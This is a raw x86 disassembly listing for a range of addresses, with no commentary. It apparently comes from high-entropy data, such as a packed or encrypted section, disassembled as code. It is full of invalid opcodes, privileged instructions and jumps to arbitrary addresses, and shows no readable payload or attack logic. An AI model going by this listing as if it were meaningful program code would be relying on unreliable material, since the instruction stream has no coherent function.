  413c7a:	repz jo 0x413c5a
  413c7d:	xchg   edi,eax
  413c7e:	outs   dx,BYTE PTR ds:[esi]
  413c7f:	sbb    DWORD PTR [eax+0x22e34f90],esp
  413c85:	arpl   WORD PTR [bp+si+0xf],dx
  413c89:	iret   
  413c8a:	repz inc eax
  413c8c:	or     al,0x78
  413c8e:	bt     ebx,ebp
  413c91:	xor    cl,BYTE PTR [ebx]
  413c93:	iret   
  413c94:	rcl    dl,0x46
  413c97:	stos   DWORD PTR es:[edi],eax
  413c98:	popa   
  413c99:	imul   ecx,DWORD PTR [eax+0x7b],0xffffffae
  413c9d:	push   edi
  413c9e:	fsub   QWORD PTR [edx-0x7ed36b54]
  413ca4:	fs xchg ebp,eax
  413ca6:	into   
  413ca7:	xchg   esp,eax
  413ca8:	out    0xa3,eax
  413caa:	cmc    
  413cab:	pushf  
  413cac:	fidiv  WORD PTR [esi+ecx*1-0xf]
  413cb0:	xlat   BYTE PTR ds:[ebx]
  413cb1:	(bad)  
  413cb2:	leave  
  413cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb4:	fdiv   st(0),st
  413cb6:	fnstcw WORD PTR [ebx+edi*2]
  413cb9:	repz mov bh,0x33
  413cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cbd:	jno    0x413d35
  413cbf:	jbe    0x413cdc
  413cc1:	jmp    0x413c99
  413cc3:	inc    eax
  413cc4:	fst    DWORD PTR [edx-0x56]
  413cc7:	das    
  413cc8:	rcl    edi,0xd5
  413ccb:	inc    BYTE PTR [ecx+0x7070a9f4]
  413cd1:	cdq    
  413cd2:	push   ebx
  413cd3:	pop    ss
  413cd4:	push   ds
  413cd5:	fild   DWORD PTR [ebx]
  413cd7:	pop    ds
  413cd8:	cmp    bh,BYTE PTR [ecx]
  413cda:	push   edx
  413cdb:	push   esi
  413cdc:	popf   
  413cdd:	icebp  
  413cde:	pop    ss
  413cdf:	pop    ds
  413ce0:	mov    ch,0x17
  413ce2:	cld    
  413ce3:	or     ecx,DWORD PTR [ebx+ebx*4+0xd]
  413ce7:	adc    DWORD PTR [edi-0x401327c8],esi
  413ced:	cmp    BYTE PTR ds:0x70f3587a,bl
  413cf3:	xor    al,0x4a
  413cf5:	rol    DWORD PTR [eax+eax*4-0x76af82fb],1
  413cfc:	fldenv [eax-0x3e4c00e5]
  413d02:	cwde   
  413d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d04:	push   cs
  413d05:	std    
  413d06:	jnp    0x413cab
  413d08:	jmp    0x413cb5
  413d0a:	loop   0x413d79
  413d0c:	ret    0xcf73
  413d0f:	daa    
  413d10:	mov    BYTE PTR [ecx+0x7d],cl
  413d13:	aam    0x89
  413d15:	stos   BYTE PTR es:[edi],al
  413d16:	xchg   esp,eax
  413d17:	scas   eax,DWORD PTR es:[edi]
  413d18:	jmp    0xfc0c:0x3ae4a0fc
  413d1f:	cmp    eax,esp
  413d21:	cmp    al,BYTE PTR [esi+ebx*2+0xc9116bf]
  413d28:	mov    ebx,0x8d38e5c5
  413d2d:	xchg   DWORD PTR [esp+eax*4-0x64],esi
  413d31:	mov    cl,0x5e
  413d33:	push   cs
  413d34:	xchg   ecx,edi
  413d36:	mov    ds:0xd631083,eax
  413d3b:	(bad)  
  413d3c:	(bad)  
  413d3e:	xchg   ebx,eax
  413d3f:	ret    0xc8c1
  413d42:	leave  
  413d43:	fbstp  TBYTE PTR [edx+0x3a]
  413d46:	hlt    
  413d47:	aad    0x89
  413d49:	mov    edi,0x803d0f9d
  413d4e:	aad    0xbf
  413d50:	dec    edx
  413d51:	jbe    0x413d5f
  413d53:	mov    ds:0x639647d5,al
  413d58:	or     esi,0xfffffffb
  413d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d5c:	adc    ebx,DWORD PTR [edi+eax*2+0x6311c00]
  413d63:	sar    BYTE PTR [edi+0x33e36fa],1
  413d69:	js     0x413dbb
  413d6b:	fdivr  st(7),st
  413d6d:	std    
  413d6e:	add    BYTE PTR [esi+0x53],cl
  413d71:	xlat   BYTE PTR ds:[ebx]
  413d72:	outs   dx,BYTE PTR ds:[esi]
  413d73:	gs iret 
  413d75:	js     0x413d81
  413d77:	pop    ebp
  413d78:	xchg   ecx,eax
  413d79:	jg     0x413d83
  413d7b:	push   ebx
  413d7c:	jle    0x413db5
  413d7e:	imul   edx,DWORD PTR [edi+0x3f],0xd0a5ba31
  413d85:	adc    bh,BYTE PTR [ecx+0x379af25]
  413d8b:	test   al,0x4f
  413d8d:	shl    DWORD PTR [ebp-0x10],0xdf
  413d91:	mov    esi,0x728d4763
  413d96:	mov    edi,0x99ca98bb
  413d9b:	popa   
  413d9c:	mov    dh,0x94
  413d9e:	je     0x413df2
  413da0:	cli    
  413da1:	stos   DWORD PTR es:[edi],eax
  413da2:	lods   al,BYTE PTR ds:[esi]
  413da3:	sub    DWORD PTR [esi-0x47493591],edi
  413da9:	sub    al,0x87
  413dab:	lock xor DWORD PTR [edx+ecx*4+0x12],ecx
  413db0:	sub    BYTE PTR [ebx],dl
  413db2:	lods   eax,DWORD PTR ds:[esi]
  413db3:	lods   al,BYTE PTR ds:[esi]
  413db4:	bound  ebp,QWORD PTR [ebx-0x1f]
  413db7:	rcr    DWORD PTR [ecx+0x7ff4ac8f],1
  413dbd:	data16 loop 0x413dc4
  413dc0:	mov    ss,WORD PTR [esi+0x11f58f26]
  413dc6:	xor    DWORD PTR [eax-0x1f7d2d09],ebp
  413dcc:	dec    ecx
  413dcd:	sub    ebp,ecx
  413dcf:	rcr    BYTE PTR [edx-0x1f],0x4b
  413dd3:	add    DWORD PTR ds:0xd50d2b5e,eax
  413dd9:	sub    al,0xf7
  413ddb:	jl     0x413e3a
  413ddd:	aam    0x3
  413ddf:	inc    ebp
  413de0:	cwde   
  413de1:	and    dl,0x90
  413de4:	pusha  
  413de5:	scas   eax,DWORD PTR es:[edi]
  413de6:	or     BYTE PTR [ebx+ecx*2],dl
  413de9:	xacquire xchg BYTE PTR [eax],al
  413dec:	xor    DWORD PTR [edx+ebp*2-0x64ce29ef],esp
  413df3:	add    BYTE PTR ss:[ebp-0xa],0x91
  413df8:	mov    edx,ss
  413dfa:	adc    DWORD PTR ds:0x3247019a,esi
  413e00:	jle    0x413dc0
  413e02:	lea    eax,[ebx+0x2f7bca54]
  413e08:	cmp    eax,0xd03250cf
  413e0d:	push   ebx
  413e0e:	js     0x413ddf
  413e10:	or     al,0xcc
  413e12:	jmp    0xbbd3b4f8
  413e17:	call   0xad44:0xa30e5237
  413e1e:	push   ds
  413e1f:	mov    ah,0xfa
  413e21:	fdivrp st(5),st
  413e23:	lahf   
  413e24:	nop
  413e25:	and    edi,esp
  413e27:	inc    edi
  413e28:	repz sub al,0x2d
  413e2b:	jb     0x413ea8
  413e2d:	push   esp
  413e2e:	xchg   ebp,eax
  413e2f:	mov    edi,0xab576a6f
  413e34:	rcl    DWORD PTR [ebp+0x2b],cl
  413e37:	std    
  413e38:	arpl   WORD PTR [eax],dx
  413e3a:	popa   
  413e3b:	push   ds
  413e3c:	mov    cl,0xd3
  413e3e:	ret    
  413e3f:	mov    ah,0x3e
  413e41:	mov    eax,ds:0xfe94806b
  413e46:	(bad)  
  413e47:	adc    dl,BYTE PTR ss:[ebp+0x13]
  413e4b:	inc    esp
  413e4c:	lea    ebp,[eax+0x39c1e6e0]
  413e52:	cld    
  413e53:	pop    edi
  413e55:	pop    eax
  413e56:	adc    dl,BYTE PTR [ecx-0x5e094849]
  413e5c:	ins    BYTE PTR es:[edi],dx
  413e5d:	aad    0x53
  413e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e60:	loope  0x413ed6
  413e62:	lds    ebp,FWORD PTR [ebx]
  413e64:	xchg   DWORD PTR [ebx+edi*2+0x497cc458],ecx
  413e6b:	sbb    bl,BYTE PTR [eax+0x7b704ac9]
  413e71:	ret    0xa318
  413e74:	or     dl,ah
  413e76:	test   BYTE PTR [ecx],dl
  413e78:	cwde   
  413e79:	bound  ecx,QWORD PTR [edx]
  413e7b:	and    esi,DWORD PTR [edx+ecx*4+0x36e183d5]
  413e82:	xor    al,0x96
  413e84:	xor    edi,DWORD PTR [ecx]
  413e86:	mov    esp,0x3a506972
  413e8b:	test   al,0xff
  413e8d:	cs xchg esp,eax
  413e8f:	inc    eax
  413e90:	push   esp
  413e91:	(bad)  
  413e93:	in     eax,0x1b
  413e95:	ret    0xadb0
  413e98:	sbb    edi,edx
  413e9a:	push   esi
  413e9b:	ret    0x8daa
  413e9e:	inc    ebp
  413e9f:	xchg   edi,eax
  413ea1:	mov    eax,0xf46ff7ee
  413ea6:	or     edx,DWORD PTR [ebx-0x3]
  413ea9:	sbb    edx,DWORD PTR [ebx+ebx*1-0x56]
  413ead:	inc    edx
  413eae:	or     al,0x57
  413eb0:	sub    eax,0x9e7ce310
  413eb5:	xchg   ebx,eax
  413eb6:	xchg   BYTE PTR [ecx],al
  413eb8:	addr16 push ecx
  413eba:	sbb    dl,BYTE PTR [ebp+0x28]
  413ebd:	jecxz  0x413eef
  413ebf:	dec    ebp
  413ec0:	(bad)  
  413ec1:	mul    ch
  413ec3:	dec    ebx
  413ec4:	outs   dx,BYTE PTR ds:[esi]
  413ec5:	cmp    BYTE PTR [ebp+0xf],bl
  413ec8:	adc    ebx,DWORD PTR [edx+0x3d]
  413ecb:	push   cs
  413ecc:	(bad)
  413ed0:	mov    WORD PTR [edi+0x66],gs
  413ed3:	ret    
  413ed4:	into   
  413ed5:	cmp    DWORD PTR [eax+0x63ef93c9],ebx
  413edb:	pusha  
  413edc:	xor    BYTE PTR [edx+0x2fec00ed],ah
  413ee2:	je     0x413f2a
  413ee4:	mov    ebp,0x754db7f6
  413ee9:	or     bh,dh
  413eeb:	jl     0x413f56
  413eed:	inc    ebx
  413eee:	adc    al,0x9f
  413ef0:	or     eax,0x7f804367
  413ef5:	arpl   WORD PTR [esi+edx*8-0x64a1ca4f],ax
  413efc:	test   al,0x23
  413efe:	int    0x1a
  413f00:	xor    bh,BYTE PTR [edi+0x62]
  413f03:	adc    eax,0x5c86075e
  413f08:	mov    bl,0xbd
  413f0a:	mov    bl,0x1d
  413f0c:	test   al,0xe
  413f0e:	cmp    BYTE PTR [esi-0x42],ch
  413f11:	mov    esp,edi
  413f13:	adc    BYTE PTR [esi],bh
  413f15:	or     ah,BYTE PTR [edi]
  413f17:	xlat   BYTE PTR ds:[ebx]
  413f18:	mov    esp,0xaae71c7f
  413f1d:	int    0xa8
  413f1f:	mov    esp,DWORD PTR [esi-0x60]
  413f22:	loop   0x413f66
  413f24:	aaa    
  413f25:	cmp    BYTE PTR [edi-0x483b139b],bl
  413f2b:	pop    ss
  413f2c:	arpl   WORD PTR [edx+0x6d202e3c],di
  413f32:	out    dx,al
  413f33:	clc    
  413f34:	and    al,0xe3
  413f36:	and    esi,DWORD PTR [edx+0x37]
  413f39:	xor    DWORD PTR [ebx-0x3b93204e],edx
  413f3f:	jb     0x413f92
  413f41:	icebp  
  413f42:	pop    ecx
  413f43:	add    edx,DWORD PTR [edi-0x5c7d1256]
  413f49:	pop    ebp
  413f4a:	jmp    0x76ec:0xb5055288
  413f51:	xor    al,0x75
  413f53:	imul   esp,DWORD PTR [ebp+0x4c985462],0x349d47ca
  413f5d:	mov    esp,0x609e31cc
  413f62:	pcmpeqd mm0,mm3
  413f65:	pop    ds
  413f66:	icebp  
  413f67:	jmp    0x413f9a
  413f69:	ror    ebp,cl
  413f6b:	jmp    0xb54b284d
  413f70:	test   DWORD PTR [ebx+0x747541d4],esp
  413f76:	adc    BYTE PTR [ebx+0x40],dl
  413f79:	and    eax,0xe87d703e
  413f7e:	or     ebp,DWORD PTR [ebp+0x61]
  413f81:	into   
  413f82:	das    
  413f83:	mov    ah,0x10
  413f85:	sahf   
  413f86:	xchg   DWORD PTR [edx],eax
  413f88:	sar    DWORD PTR [ebx+0x5d662f4d],1
  413f8e:	sbb    bh,BYTE PTR [edi]
  413f90:	pop    edx
  413f91:	outs   dx,BYTE PTR cs:[esi]
  413f93:	mov    cs,ebp
  413f95:	mov    dh,0x63
  413f97:	popf   
  413f98:	and    ebp,ebp
  413f9a:	cli    
  413f9b:	gs xchg ebx,eax
  413f9d:	repnz xor cl,BYTE PTR [eax+0x39a8b4fe]
  413fa4:	nop
  413fa5:	push   DWORD PTR [esi-0x5d]
  413fa8:	pop    edi
  413fa9:	and    al,0xf
  413fab:	and    eax,0x1d03e876
  413fb0:	js     0x413fad
  413fb2:	pusha  
  413fb3:	test   al,cl
  413fb5:	xchg   BYTE PTR [edx-0x453307c0],dh
  413fbb:	xchg   esi,eax
  413fbc:	push   0xffffffa8
  413fbe:	rol    ecx,cl
  413fc0:	int3   
  413fc1:	cmp    DWORD PTR [esi-0x58],ecx
  413fc4:	xor    al,0x56
  413fc6:	pop    edi
  413fc7:	stos   BYTE PTR es:[edi],al
  413fc8:	ficomp DWORD PTR [edi+0x36aae87c]
  413fce:	(bad)  
  413fcf:	xlat   BYTE PTR ds:[ebx]
  413fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fd1:	stos   BYTE PTR es:[edi],al
  413fd2:	push   esi
  413fd3:	push   ss
  413fd4:	jmp    0xbc9852a7
  413fd9:	aas    
  413fda:	out    dx,al
  413fdb:	mov    ah,ah
  413fdd:	call   FWORD PTR [esi+0x7f985480]
  413fe3:	mov    cl,0x6
  413fe5:	(bad)  
  413fe7:	and    eax,DWORD PTR [edi+ebp*2-0x47]
  413feb:	sti    
  413fec:	jne    0x413fd6
  413fee:	xchg   DWORD PTR [edi+0x60],edx
  413ff1:	jnp    0x41406f
  413ff3:	fadd   QWORD PTR [ecx-0x5d2f4cd1]
  413ff9:	mov    edx,0x8337bb1a
  413ffe:	aas    
  413fff:	jge    0x414030
  414001:	jo     0x413ffb
  414003:	dec    esp
  414004:	pop    ecx
  414005:	mov    ch,0x38
  414007:	sub    bl,BYTE PTR [ebp+eiz*2-0x1b]
  41400b:	test   DWORD PTR [ebx],esp
  41400d:	inc    ebx
  41400e:	gs and eax,0xc2f6fef2
  414014:	mov    edx,0xdb84e9bd
  414019:	inc    ecx
  41401a:	sub    DWORD PTR [edi-0x6309428],eax
  414020:	ins    DWORD PTR es:[edi],dx
  414021:	stos   BYTE PTR es:[edi],al
  414022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414023:	je     0x413fc4
  414025:	dec    ecx
  414026:	sbb    bh,BYTE PTR [ecx+0x298cb844]
  41402c:	sub    bl,ch
  41402e:	jl     0x414078
  414030:	and    DWORD PTR [ecx+0x54],esi
  414033:	in     eax,dx
  414034:	data16 jns 0x4140a0
  414037:	fmul   QWORD PTR [ebx+ebp*2]
  41403a:	cmp    al,0x79
  41403c:	sbb    esi,DWORD PTR [ecx]
  41403e:	jns    0x414023
  414040:	sub    eax,0x9e82c138
  414045:	xor    esi,eax
  414047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414048:	jae    0x41408a
  41404a:	pop    esi
  41404b:	lds    esp,FWORD PTR [eax+0x5885e25f]
  414051:	lahf   
  414052:	cmp    edi,DWORD PTR [ebp+esi*8+0x2dea25d7]
  414059:	jns    0x414050
  41405b:	shl    DWORD PTR [ecx+0x513b36],0x86
  414062:	pop    ss
  414063:	or     BYTE PTR [edi+ebp*1-0xd6c29fa],0xdf
  41406b:	add    al,0xbe
  41406d:	mov    ebx,0x4568c25c
  414072:	lock call 0xcb06:0x78d37ba3
  41407a:	adc    eax,0x53332957
  41407f:	icebp  
  414080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414081:	dec    cl
  414083:	test   BYTE PTR [ecx-0x33],0x80
  414087:	jmp    0xd2c2b99d
  41408c:	mov    al,0x7a
  41408e:	mov    esi,0xe373ba9b
  414093:	cmp    BYTE PTR [ebx+0x7d],0xd3
  414097:	inc    ebx
  414098:	inc    ebp
  414099:	dec    esp
  41409a:	stos   DWORD PTR es:[edi],eax
  41409b:	lock inc esp
  41409d:	ror    dh,0xdd
  4140a0:	and    DWORD PTR [ebx+0xf66fe1a],0x7b
  4140a7:	(bad)  
  4140a9:	ror    DWORD PTR [edi],cl
  4140ab:	cmp    eax,0x871f5083
  4140b0:	retf   0x61ef
  4140b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140b4:	jle    0x4140a1
  4140b6:	adc    bh,BYTE PTR [ebx]
  4140b8:	push   ebp
  4140b9:	test   al,0x2b
  4140bb:	add    esp,esi
  4140bd:	xchg   edx,eax
  4140be:	dec    ebx
  4140bf:	and    ah,ah
  4140c1:	mov    ecx,0x463c7ce
  4140c6:	inc    esi
  4140c7:	aaa    
  4140c8:	inc    edi
  4140c9:	lahf   
  4140ca:	ret    0xf2f8
  4140cd:	pop    ds
  4140ce:	test   al,0xda
  4140d0:	outs   dx,DWORD PTR ds:[esi]
  4140d1:	loop   0x414067
  4140d3:	pop    esi
  4140d4:	repz cwde 
  4140d6:	fwait
  4140d7:	mul    eax
  4140d9:	xchg   dh,ah
  4140db:	mov    ah,BYTE PTR [ebx+0x6b]
  4140de:	(bad)  
  4140e0:	retf   
  4140e1:	sub    cl,BYTE PTR fs:[esi+0x294ed5e8]
  4140e8:	add    DWORD PTR [ecx-0x6c03cb1],edx
  4140ee:	inc    ecx
  4140ef:	xor    eax,0xcc320f07
  4140f4:	pop    ebx
  4140f5:	cmp    al,0xf4
  4140f7:	scas   al,BYTE PTR es:[edi]
  4140f8:	pop    ds
  4140f9:	cli    
  4140fa:	(bad)  
  4140fb:	jg     0x414165
  4140fd:	mov    ebx,0x672e5241
  414102:	outs   dx,BYTE PTR ds:[esi]
  414103:	xor    BYTE PTR [ebx],dl
  414105:	push   0x42
  414107:	add    eax,0xb455439d
  41410c:	sbb    eax,0xa6d0531e
  414111:	xchg   ecx,eax
  414112:	outs   dx,BYTE PTR ds:[esi]
  414113:	stc    
  414114:	test   ebx,0xaba54a37
  41411a:	xlat   BYTE PTR ds:[ebx]
  41411b:	aas    
  41411c:	jmp    0x41415b
  41411e:	push   eax
  41411f:	or     DWORD PTR [esi],esp
  414121:	hlt    
  414122:	ret    0x603
  414125:	xchg   esp,eax
  414126:	fwait
  414127:	test   BYTE PTR [edx+0x38],dl
  41412a:	push   ebp
  41412b:	sbb    DWORD PTR [esi+0x358f066c],ecx
  414131:	adc    ecx,esp
  414133:	pop    eax
  414134:	jle    0x4140db
  414136:	mov    dl,0x65
  414138:	fsubr  DWORD PTR [ecx-0x2c]
  41413b:	(bad)  
  41413d:	xor    al,al
  41413f:	inc    ecx
  414140:	pop    ecx
  414141:	hlt    
  414142:	jg     0x41414a
  414144:	xchg   ebx,eax
  414145:	jno    0x4140c8
  414147:	(bad)  
  414149:	sahf   
  41414a:	mov    ss,WORD PTR [edi]
  41414c:	jo     0x414188
  41414e:	fistp  QWORD PTR [ebp-0x45e7f74b]
  414154:	add    al,bh
  414156:	sub    al,0xc5
  414158:	pop    esp
  414159:	or     DWORD PTR [ecx+0x59],esp
  41415c:	data16 jbe 0x4141cb
  41415f:	sbb    eax,DWORD PTR [ebp+0x72324f48]
  414165:	gs test al,0x49
  414168:	push   edi
  414169:	in     eax,0xf1
  41416b:	inc    edx
  41416c:	xchg   edx,eax
  41416d:	or     ebx,edi
  41416f:	mov    BYTE PTR [esi+0x4d],dh
  414172:	push   edx
  414173:	rcl    BYTE PTR [eax],0xe3
  414176:	es cld 
  414178:	call   0x70e3:0xa2c411f4
  41417f:	mov    ebp,0x53214f8e
  414184:	bound  edi,QWORD PTR [esi+0x0]
  414187:	sub    al,BYTE PTR [edi]
  414189:	test   DWORD PTR [edx],edi
  41418b:	xchg   esi,eax
  41418c:	xor    al,BYTE PTR [ecx+ecx*8+0x51]
  414190:	jns    0x414191
  414192:	xlat   BYTE PTR ds:[ebx]
  414193:	stos   DWORD PTR es:[edi],eax
  414194:	jo     0x41414d
  414196:	(bad)  
  414197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414198:	jge    0x41413b
  41419a:	das    
  41419b:	aam    0x13
  41419d:	leave  
  41419e:	enter  0x54f1,0x8b
  4141a2:	cmp    eax,DWORD PTR [esi]
  4141a4:	(bad)  [edx]
  4141a6:	(bad)  
  4141a7:	fcomp  st(1)
  4141a9:	enter  0x90ee,0x2b
  4141ad:	adc    ebp,DWORD PTR [ecx]
  4141af:	mov    edi,0x60559968
  4141b4:	daa    
  4141b5:	lea    eax,[edx]
  4141b7:	mov    esp,0xfc3e836b
  4141bc:	imul   ebp,ecx,0xffffffea
  4141bf:	mov    DWORD PTR [esi+0x12],0x711b2da9
  4141c6:	jo     0x4141bb
  4141c8:	sub    dl,BYTE PTR [edi+0x5659f4ed]
  4141ce:	nop
  4141cf:	add    DWORD PTR [eax],edx
  4141d1:	loopne 0x414153
  4141d3:	lahf   
  4141d4:	xchg   ebp,eax
  4141d5:	inc    edx
  4141d6:	pop    edx
  4141d7:	adc    al,0x6d
  4141d9:	xlat   BYTE PTR ds:[ebx]
  4141da:	mov    ecx,0x623d1463
  4141df:	call   FWORD PTR [eax-0x3024085d]
  4141e5:	sar    DWORD PTR [eax],1
  4141e7:	or     BYTE PTR [edx-0x49],cl
  4141ea:	and    al,0x2f
  4141ec:	enter  0x8bb9,0x56
  4141f0:	dec    ebx
  4141f1:	mov    ch,0x89
  4141f3:	pop    ss
  4141f4:	pushf  
  4141f5:	test   eax,0xa617452c
  4141fa:	cwde   
  4141fb:	fisub  DWORD PTR [ecx]
  4141fd:	push   0xe79d32ea
  414202:	mov    esp,0x530878de
  414207:	sar    edi,cl
  414209:	stos   DWORD PTR es:[edi],eax
  41420a:	dec    edi
  41420b:	stos   DWORD PTR es:[edi],eax
  41420c:	sub    dl,BYTE PTR [edx+edx*1-0x1e]
  414210:	(bad)  
  414211:	push   ss
  414212:	pop    edi
  414213:	repz jb 0x4141d6
  414216:	sub    ebx,ebx
  414218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414219:	dec    edx
  41421a:	lock jmp 0x7ac2b04c
  414220:	mov    edx,0x77f2d769
  414225:	mov    ah,ah
  414227:	push   ds
  414228:	push   0xfffffff6
  41422a:	and    BYTE PTR [esi+0x2e],ch
  41422d:	jg     0x414227
  41422f:	xchg   DWORD PTR [edx+0x46],edi
  414232:	scas   al,BYTE PTR es:[edi]
  414233:	cmp    al,0xf6
  414235:	adc    BYTE PTR [ebx-0x61],al
  414238:	xchg   esi,esi
  41423a:	sub    BYTE PTR [ebx-0x1d7d45b2],0x98
  414241:	fldenv gs:[esi+0x51fe63ff]
  414248:	mov    ds:0x208618c1,al
  41424d:	loopne 0x414243
  41424f:	jae    0x414260
  414251:	and    al,BYTE PTR [edx-0x8f77950]
  414257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414258:	test   eax,0xb125cdfb
  41425d:	jmp    0x41420a
  41425f:	nop
  414260:	mov    al,ds:0xc532feb5
  414265:	cmp    edi,DWORD PTR [esi+0x5633a5c6]
  41426b:	pop    ebx
  41426c:	xor    dl,ah
  41426e:	mov    ch,0x90
  414270:	scas   al,BYTE PTR es:[edi]
  414271:	dec    edi
  414272:	jge    0x414203
  414274:	je     0x414203
  414276:	out    0x77,al
  414278:	push   edi
  414279:	mov    ch,0xb3
  41427b:	mov    ds:0x258b21aa,eax
  414280:	dec    ebx
  414281:	xlat   BYTE PTR ds:[ebx]
  414282:	test   BYTE PTR [edx+ecx*2],0x7e
  414286:	push   0x8a876db5
  41428b:	stos   DWORD PTR es:[edi],eax
  41428c:	or     eax,0x6004dbb7
  414291:	pop    ss
  414292:	(bad)  
  414293:	in     al,dx
  414294:	sbb    eax,0xb38a8084
  414299:	jnp    0x4142a5
  41429b:	setle  BYTE PTR [edx-0x7a]
  41429f:	ds dec ebp
  4142a1:	jb     0x4142b7
  4142a3:	push   esi
  4142a4:	adc    eax,0xd974f279
  4142a9:	popa   
  4142aa:	fadd   QWORD PTR ds:0x3f8814c3
  4142b0:	jno    0x414239
  4142b2:	aaa    
  4142b3:	mov    edi,0x5dd3fc29
  4142b8:	jbe    0x4142d0
  4142ba:	into   
  4142bb:	mov    ebp,0xd3fe7d62
  4142c0:	pop    ebp
  4142c1:	pop    eax
  4142c2:	cmp    dh,BYTE PTR [eax]
  4142c4:	repz inc ebx
  4142c6:	ss adc bh,al
  4142c9:	mov    al,ds:0xeaff442a
  4142ce:	mov    edi,DWORD PTR [esi+0x3a]
  4142d1:	or     al,0x40
  4142d3:	jle    0x4142f1
  4142d5:	sbb    DWORD PTR [eax+eiz*2],ebp
  4142d8:	mov    cl,BYTE PTR [ebx]
  4142da:	daa    
  4142db:	sbb    bl,dh
  4142dd:	sub    BYTE PTR [edi],ah
  4142df:	ret    0x5a19
  4142e2:	xchg   edi,eax
  4142e3:	fcom   QWORD PTR [eax-0x3a1e4974]
  4142e9:	ret    
  4142ea:	nop
  4142eb:	aas    
  4142ec:	imul   eax,DWORD PTR [edx-0x49],0xceba9814
  4142f3:	xor    eax,0xf326b06a
  4142f8:	test   bh,cl
  4142fa:	jge    0x41428e
  4142fc:	pop    ecx
  4142fd:	cmp    al,0xb8
  4142ff:	mov    cl,0x1f
  414301:	adc    eax,0x2ed2f21b
  414306:	enter  0xff0b,0x15
  41430a:	push   ebx
  41430b:	imul   esi,edi,0xffffffb6
  41430e:	(bad)  
  41430f:	sub    eax,0x6bffc00c
  414314:	fmul   DWORD PTR [esi-0x62f86e76]
  41431a:	std    
  41431b:	aas    
  41431c:	add    eax,0xcfa0ae6e
  414321:	xor    al,0x25
  414323:	lea    edi,[edi]
  414325:	(bad)  
  414326:	mov    bl,0x6f
  414328:	sti    
  414329:	add    eax,0x7f2e8c3c
  41432e:	jae    0x414308
  414330:	cmp    eax,0x2ee5853d
  414335:	popa   
  414336:	xor    eax,0xf9c9e9dd
  41433b:	mov    ebx,0x66a36402
  414340:	test   bh,bh
  414342:	push   ecx
  414343:	in     eax,0x19
  414345:	daa    
  414346:	dec    esi
  414347:	pop    es
  414348:	fwait
  414349:	dec    ecx
  41434a:	ds mov ch,0x65
  41434d:	pop    ecx
  41434e:	repz sub eax,0xd4319af
  414354:	jae    0x414358
  414356:	inc    eax
  414357:	fdiv   DWORD PTR [ecx]
  414359:	push   ebp
  41435a:	sbb    edi,DWORD PTR [eax]
  41435c:	adc    esi,ebp
  41435e:	jb     0x414331
  414360:	push   ebp
  414361:	mov    al,0xcf
  414363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414364:	pop    eax
  414365:	scas   eax,DWORD PTR es:[edi]
  414366:	test   eax,0x32084d69
  41436b:	imul   BYTE PTR [esi-0x30]
  41436e:	in     al,0x87
  414370:	xlat   BYTE PTR ds:[ebx]
  414371:	popa   
  414372:	lods   al,BYTE PTR ds:[esi]
  414373:	pop    edi
  414374:	inc    ebx
  414375:	stc    
  414376:	call   0x2c10:0x932f3c2e
  41437d:	pop    edx
  41437e:	cld    
  41437f:	iret   
  414380:	jg     0x4143f6
  414382:	inc    edx
  414383:	or     eax,DWORD PTR [ebx+0x1e]
  414386:	sub    eax,0xe734bc3b
  41438b:	add    dh,bh
  41438d:	dec    ecx
  41438e:	scas   eax,DWORD PTR es:[edi]
  41438f:	mov    eax,0x89d5fe8c
  414394:	pop    esp
  414395:	or     BYTE PTR [ecx+eax*4-0x3c3296f9],ch
  41439c:	mov    ah,al
  41439e:	pop    esi
  41439f:	mov    ah,0x61
  4143a1:	mov    dl,0x15
  4143a3:	and    edx,DWORD PTR [ebp-0x36d24c81]
  4143a9:	inc    esp
  4143aa:	in     eax,0x69
  4143ac:	add    esp,DWORD PTR [edi+0x799abf9d]
  4143b2:	arpl   WORD PTR [ebx+edi*1],cx
  4143b5:	xchg   edx,eax
  4143b6:	sbb    edx,edi
  4143b8:	mov    edi,0x3023398b
  4143bd:	gs dec eax
  4143bf:	outs   dx,DWORD PTR ds:[esi]
  4143c0:	bound  edx,QWORD PTR [ecx]
  4143c2:	retf   
  4143c3:	lods   eax,DWORD PTR ds:[esi]
  4143c4:	leave  
  4143c5:	jge    0x4143be
  4143c7:	out    dx,al
  4143c8:	jecxz  0x4143c2
  4143ca:	add    al,0x39
  4143cc:	add    BYTE PTR [ebx-0x6d761e08],dl
  4143d2:	js     0x41441b
  4143d4:	and    eax,0x404a42c3
  4143d9:	jle    0x414427
  4143db:	lmsw   cx
  4143de:	lock stos BYTE PTR es:[edi],al
  4143e0:	add    bh,BYTE PTR [ebp+0x45e7dcb3]
  4143e6:	inc    DWORD PTR [ebp-0x1b664912]
  4143ec:	imul   eax,DWORD PTR [ebp-0x7cc0c2b0],0xb95bb518
  4143f6:	mov    bl,0xa0
  4143f8:	loope  0x414459
  4143fa:	dec    esi
  4143fb:	xchg   esi,eax
  4143fc:	lods   eax,DWORD PTR ds:[esi]
  4143fd:	aam    0x88
  4143ff:	ffree  st(5)
  414401:	enter  0xb8c5,0x8c
  414405:	shr    BYTE PTR [ecx],0xe0
  414408:	jbe    0x4143c1
  41440a:	jno    0x4143a7
  41440c:	div    DWORD PTR [ebp+0x2d]
  41440f:	inc    ebx
  414410:	dec    edx
  414411:	adc    BYTE PTR [ecx-0x33],dl
  414414:	addr16 add esi,eax
  414417:	shr    ecx,cl
  414419:	inc    edx
  41441a:	push   eax
  41441b:	sti    
  41441c:	popf   
  41441d:	xchg   WORD PTR [esp+edi*4],si
  414421:	mov    dl,0x21
  414423:	fdivr  QWORD PTR [edi+0x5de6a838]
  414429:	mov    ecx,0x687dd8c3
  41442e:	loope  0x4143e6
  414430:	add    BYTE PTR [ebx+ecx*4+0xe03c9db],bl
